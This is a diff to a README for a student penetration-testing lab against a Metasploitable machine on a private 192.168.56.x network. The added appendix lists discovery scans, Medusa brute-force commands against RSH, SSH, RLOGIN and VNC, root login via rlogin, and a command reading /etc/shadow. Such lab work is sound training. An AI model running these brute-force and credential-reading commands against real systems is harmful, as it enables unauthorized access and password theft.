@@ -1,4 +1,4 @@
-# Project: Network Penetration Testing & Password Cracking
+# Project: Penetration Testing & Password Cracking
 
 ## Overview
 This project demonstrates a comprehensive network penetration testing methodology involving host discovery, service enumeration, and password cracking attacks. The assessment targeted a Metasploitable vulnerable machine using tools like fping, nbtscan, nmap, and Medusa to identify security weaknesses and gain unauthorized access.
@@ -50,13 +50,13 @@ This project demonstrates a comprehensive network penetration testing methodolog
 - Chose SSH, RSH, RLOGIN, and VNC based on vulnerability assessment
 - Prioritized services with known weak authentication mechanisms
 
-![Selected Services](screenshots/selected-services.png)
+![Selected Services](screenshots/nmap-detailed-results.png)
 *Target services selected for password cracking attempts*
 
 ### 6. RSH Cracking Attempt
 - Attempted brute-force attack against RSH service
 - Used Medusa with username and password wordlists
-- Service resisted cracking attempts with provided credentials
+- Service resisted cracking attempts with provided credentials and was a fail
 
 ![RSH Cracking Attempt](screenshots/rsh-cracking-failed.png)
 *Unsuccessful RSH password cracking attempt*
@@ -67,7 +67,7 @@ This project demonstrates a comprehensive network penetration testing methodolog
 ### 7. SSH Cracking Attempt
 - Targeted SSH service with common credential combinations
 - Utilized Medusa's SSH module for authentication attacks
-- Service demonstrated stronger password security
+- Service demonstrated stronger password security and was a fail
 
 ![SSH Cracking Attempt](screenshots/ssh-cracking-failed.png)
 *SSH password cracking attempts showing no successful breaches*
@@ -130,11 +130,6 @@ This project demonstrates a comprehensive network penetration testing methodolog
 - **Lack of Lockout**: No account lockout mechanisms enabled on vulnerable services
 - **Default Configurations**: Multiple services retained factory default credentials
 
-### Performance Considerations
-- **Scan Efficiency**: Fping provided faster host discovery than traditional ping sweeping
-- **Resource Usage**: Medusa cracking attempts consumed significant network bandwidth
-- **Time Investment**: Comprehensive testing required substantial time investment
-
 ---
 
 ## Reflections
@@ -170,3 +165,53 @@ This project demonstrates a comprehensive network penetration testing methodolog
 ```bash
 ifconfig
 ip addr show
+```
+
+2. **Host Discovery**
+```bash
+fping -g 192.168.56.0/24 -a -s
+nmap -sn 192.168.56.0/24
+```
+
+3. **Service Identification**
+```bash
+nbtscan 192.168.56.100-103
+nmap -sS -sV -v 192.168.56.103
+```
+
+4. **Password Cracking Preparation**
+```bash
+# Create wordlists
+echo -e "root\nadmin\nwww-data\nuser\ntest" > users.txt
+echo -e "123456\npassword\nadmin\n12345\n123456789" > passwords.txt
+```
+
+5. **Cracking Attempts**
+```bash
+# RSH Cracking Attempt
+medusa -h 192.168.56.103 -U users.txt -P passwords.txt -M rsh
+
+# SSH Cracking Attempt
+medusa -h 192.168.56.103 -U users.txt -P passwords.txt -M ssh
+
+# RLOGIN Cracking Attempt
+medusa -h 192.168.56.103 -U users.txt -P passwords.txt -M rlogin
+
+# VNC Cracking Attempt
+medusa -h 192.168.56.103 -U users.txt -P passwords.txt -M vnc
+```
+
+6. **Post-Compromise Access**
+```bash
+# RLOGIN access
+rlogin -l root 192.168.56.103
+
+# VNC access
+vncviewer 192.168.56.103:5900
+```
+
+7. **Privilege Verification**
+```bash
+whoami
+cat /etc/shadow
+```
